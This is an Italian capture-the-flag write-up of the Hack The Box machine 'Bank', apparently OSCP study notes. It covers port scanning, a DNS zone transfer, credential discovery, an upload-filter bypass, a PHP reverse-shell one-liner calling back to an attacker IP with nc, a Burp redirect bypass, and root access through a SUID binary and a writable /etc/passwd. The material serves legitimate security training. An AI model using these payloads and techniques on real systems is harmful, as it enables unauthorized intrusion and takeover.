**TARGET: 10.10.10.29**

# INFORMATION GATHERING 

Lanciamo un scan con [Nmap](Note/Tool/Nmap.md) per vedere quali porte e quali servizi girano sulla macchina target

```bash
┌──(root㉿kali)-[/home/kali/htb/bank]
└─# nmap -sC -sV -O -p- --min-rate=5000 10.10.10.29
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 07:39 EDT
Nmap scan report for 10.10.10.29
Host is up (0.047s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Aggressive OS guesses: Linux 3.12 (96%), Linux 3.13 (96%), Linux 3.16 (96%), Linux 3.18 (96%), Linux 3.2 - 4.9 (96%), Linux 3.8 - 3.11 (96%), Linux 4.8 (96%), Linux 4.4 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.41 seconds
```

Abbiamo 3 porte aperte

- 22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 
- 53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
- 80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))


# ENUMERATION

## Port 80

La porta 80 ci ritorna la pagina di default di Apache2

![img](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank.png)
Nulla di interessante, Passiamo alla porta 53.

# Port 53

La prima cosa che controllo quando vedo TCP 53 è un trasferimento di zona. Non vedo alcun accenno al nome host/dominio, quindi immagino che potrebbe essere bank.htb e funziona:

```bash
┌──(root㉿kali)-[/home/kali/htb/bank]
└─# dig axfr @10.10.10.29 bank.htb

; <<>> DiG 9.18.13-1-Debian <<>> axfr @10.10.10.29 bank.htb
; (1 server found)
;; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 40 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP)
;; WHEN: Tue Aug 15 07:47:45 EDT 2023
;; XFR size: 6 records (messages 1, bytes 171)
```

Aggiungiamo i sottodomini al nostro file /etc/hosts

```bash
10.10.10.29 bank.htb ns.bank.htb www.bank.htb chris.bank.htb
```

### bank.htb

Visitando http://bank.htb ci troviamo davanti ad un prompt di login.
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank1.png)
Ci chiede una  email e una password che al momento non abbiamo.
Ho provato alcune supposizioni di base (amministratore/amministratore, banca/banca, ecc.) E alcune enumerazione SQLI di base (mettendo ' in ogni campo), ma non è emerso nulla di interessante.

Inizierò un gobuster per cercare pagine aggiuntive, utilizzando il flag -x php poiché ho osservato che il sito esegue PHP:

```bash
┌──(root㉿kali)-[/home/kali/htb/bank]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bank.htb -x php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bank.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/08/16 13:47:38 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 302) [Size: 7322] [--> login.php]
/login.php            (Status: 200) [Size: 1974]
/support.php          (Status: 302) [Size: 3291] [--> login.php]
/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]
/server-status (Status: 403)
/balance-transfer (Status: 301) 
===============================================================
2023/08/16 13:48:25 Finished
===============================================================
```

Allora abbiamo diverse directory esposte

- `/index.php` ci reindirizza al login.php cosi come `support.php`
- `/uploads` ci da un Forbidden 
- `/assets` ha l'elenco delle directory abilitato, ma non ho visto nulla di particolarmente interessante.
- `logout.php` ci reindirizza alla index.php
- `/inc` ha quattro file PHP 

header.php restituisce un 302 a login.php, che porta il browser a /inc/login.php che non esiste. Sospetto che tutte le pagine abbiano questa intestazione, che controlla una sessione valida e quindi reindirizza in caso contrario. Gli altri tre restituiscono pagine vuote (il che ha senso, poiché devono essere incluse).

- `/balance-transfer ` fornisce un elenco di directory con molti file .acc, ognuno dei quali è di 32 caratteri esadecimali (MD5?):

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank3.png)Notiamo che hanno tutti più o meno la stessa dimensione che varia da 583 a 586 tutti tranne una che pesa 257 k come possiamo vedere nella figura sotto.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank4.png)

La scarichiamo, lo apriamo e troviamo quelle che sembrano della credenziali 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/bank6.png)


```
===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
```


Utilizziamo le credenziali  in http://bank.htb/login.php e siamo dentro.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank7.png)

# GAINING AN INITIAL FOOTHOLD 

Nella sezione support abbiamo la possibilità di caricare dei file, visto che la web app è in php ho provato a ad inserire un file .php per testare se avevamo un RCE  ma ci dice che possiamo caricare solo immagini.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank8.png)

modificando il nome nel file .php in .jpg riusciamo a caricarlo come da immagine

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank9.png)

ma richiamando la pagina abbiamo questo tipo di risposta
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank10.png)
l'estensione è corretta ma ci da comunque un errore.
Tornando alla pagina support e ispezionando il codice sorgente troviamo questa riga 

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank11.png)

Questo riga ci dice ha bisogna mettere l'estensione .htb per permettere di eseguire il file caricato.

Proviamo...
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/bank12.png)Ci siamo, abbiamo la nostra RCE non ci resta che caricare una revshell per ottenere un punto 'ingresso.

Qui abbiamo la nostra revshell.php (rinominata in .htb per bypassare le restrizioni)
```bash
┌──(root㉿kali)-[/home/kali/htb/bank]
└─# cat revers.htb
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 9443 >/tmp/f"); ?>
```

ci mettiamo in ascolto con nc

```bash
┌──(root㉿kali)-[/home/kali/htb/bank]
└─# nc -lnvp 9443
listening on [any] 9443 ...
```

Carichiamo la revshell  nella pagina `/support.php` ed eseguiamo per ottenere la nostra shell

```bash
┌──(root㉿kali)-[/home/kali/htb/bank]
└─# nc -lnvp 9443
listening on [any] 9443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.29] 59196
/bin/sh: 0: can't access tty; job control turned off
$

```


E qui abbiamo la nostra flag
```bash
www-data@bank:/home/chris$ cat user.txt
45a4453f93f78fb2460ba5903105e345
www-data@bank:/home/chris$
```

## BYPASS CREDS

Durante l'enumerazione con gobuster abbiamo notato diversi 302 Found, questo ci dice cha la pagina esiste  ma per qualche motivo veniamo reindirizzati e non non possiamo accedervi... 

```
/index.php            (Status: 302) [Size: 7322] [--> login.php]
/support.php          (Status: 302) [Size: 3291] [--> login.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
```

Approfondiamo con burpsuit.

Apriamo burp e il nostro browser per intercettare il traffico.
Nella preferenze di burp, nella sezione "Match/Replace" impostiamo come vediamo nell'immagine.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank14.png)

Cosi facendo ad ogni 302 Found Burp farà corrispondere automaticamente un 200 facendoci accedere all risorsa richiesta.

Proviamo a visitare `/index.php`
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank15.png)
Perfetto riusciamo ad accedere alla risorsa. vediamo cosa ci restituisce `/support.php`

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Bank16.png)

A questo punto possiamo utilizzare la stessa RCE vista nella sezione precedente per aver il nostro punto d'appoggio iniziale e compromettere la macchina. 
# PRIVESC
Una cosa da cercare sono i binari con il flag Set UID attivo. Si tratta di eseguibili configurati in modo tale da non essere eseguiti come utente corrente, ma come proprietario del file. Quindi, quando un binario è SUID e di proprietà di root, verrà eseguito come root. Se riesco a indurre quel file a eseguire altri comandi, ho l'esecuzione del comando come root.

Un binario SUID avrà una s invece di una x nell'autorizzazione eseguibile per l'utente nell'output ls -l, in questo modo:

```bash
$ ls -l /usr/bin/passwd 
-rwsr-xr-x 1 root root 45420 May 17 2017 /usr/bin/passwd
```

Scarichiamo nella cartella tmp della macchina target LinEmun.sh, gli diamo i permessi ed eseguiamo.

```bash
www-data@bank:/tmp$ ./LinEnum.sh
...<snip>...
[-] SUID files:
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 daemon daemon 46652 Oct 21  2013 /usr/bin/at
-rwsr-xr-x 1 root root 35916 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 45420 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 44620 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 18168 Nov 24  2015 /usr/bin/pkexec
-rwsr-xr-x 1 root root 30984 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 18136 May  8  2014 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 66284 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 156708 May 29  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 72860 Oct 21  2013 /usr/bin/mtr
-rwsr-sr-x 1 libuuid libuuid 17996 Nov 24  2016 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 323000 Apr 21  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 38932 May  8  2014 /bin/ping
-rwsr-xr-x 1 root root 43316 May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 35300 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 30112 May 15  2015 /bin/fusermount
-rwsr-xr-x 1 root root 88752 Nov 24  2016 /bin/mount
-rwsr-xr-x 1 root root 67704 Nov 24  2016 /bin/umount

...<snip>...

```

Il primo è particolarmente interessante e non standard, /var/htb/bin/emergency.

Ci rechiamo nella cartella ed eseguiamo il binario
```bahs
www-data@bank:/var/htb/bin$ ./emergency
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
#
```
e ci restituisce una shell da root.

e ci prendiamo la nostra root flag.

```bash
# cd /root
# ls
root.txt
# cat root.txt
7c70de5609c54c321acd5f376231b436
```
## PRIVESC SENZA LINENUM.SH

Posso cercare tutti i binari SUID di proprietà di root sul sistema con questo comando find:

```bash
find / -type f -user root -perm -4000 2>/dev/null
```
Dove: 

cerca in tutte le sottodirectory di / (l'intero file system)
-type f - restituisce solo i file
-user root - restituisce solo i file di proprietà di root
-perm -4000 - file con set di bit SUID
2>/dev/null - non mostra errori

Su Bank, trova diversi elementi:

```bash
www-data@bank:/var/htb/bin$ find / -type f -user root -perm -4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
www-data@bank:/var/htb/bin$
```

notiamo anche qui un binario strano /var/htb/bin/emergency
ci rechiamo nella path, lo eseguiamo e abbiamo la nostra shell.

```bash
www-data@bank:/var/htb/bin$ ./emergency
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
#
```

## PRIVESC PASSW PATH

Due dei file utilizzati per gestire l'account utente su una macchina Linux sono /etc/passwd e /etc/shadow. passwd è leggibile da qualsiasi utente, ma shadow in genere contiene gli hash delle password ed è leggibile solo da root e dai membri del gruppo shadow. Nelle prime versioni di Linux, gli hash delle password erano semplicemente archiviati in passwd, ma questo era considerato un rischio per la sicurezza una volta che le persone avevano iniziato a decifrare gli hash.

In una normale installazione di Linux, i permessi per questi file sarebbero:

```bash
root@kali# ls -l /etc/passwd /etc/shadow 
-rw-r--r-- 1 root root 3297 Jun 22 16:19 /etc/passwd 
-rw-r----- 1 root shadow 1839 Jun 22 16:19 /etc/shadow
```

Andiamo a vedere come sono configurati sulla macchina target

```bash
www-data@bank:/$ ls -l /etc/passwd /etc/shadow 
-rw-rw-rw- 1 root root 1252 May 28 2017 /etc/passwd 
-rw-r----- 1 root shadow 895 Jun 14 2017 /etc/shadow
```

il file passwd è scrivibile da chiunque e questo ci consenti di inserire all'intero nella credenziali che vogliamo per avere i privilegi root .

Poiché passwd una volta conteneva gli hash, può ancora farlo. In genere c'è una x dove sarebbe l'hash, a indicare che l'hash è effettivamente in ombra. Ma se ci metto un hash, funzionerà.

Aggiungerò un utente con userid e groupid 0, che rende tale utente root con una password diversa.

Per prima cosa genererò un hash della password per la password "xRabbit" usando openssl:

```bash
www-data@bank:/var/htb/bin$ openssl passwd -1 xrabbit
$1$OaA56slc$3N.vHN3J/jwBhL2BfoFsB.
www-data@bank:/var/htb/bin$
```

Aggiungerò una riga a /etc/passwd usando echo:

```bash
www-data@bank:/$ echo'xrabbit:$1$OaA56slc$3N.vHN3J/jwBhL2BfoFsB.:0:0:pwned:/root:/bin/bash' >> /etc/passwd
```

Con l'utente aggiunto, posso usare il comando su sull utente xrabbit, che restituisce la shell root:

```bash
www-data@bank:/var/htb/bin$ su - xrabbit
Password:
root@bank:~# id
uid=0(root) gid=0(root) groups=0(root)
root@bank:~#
```
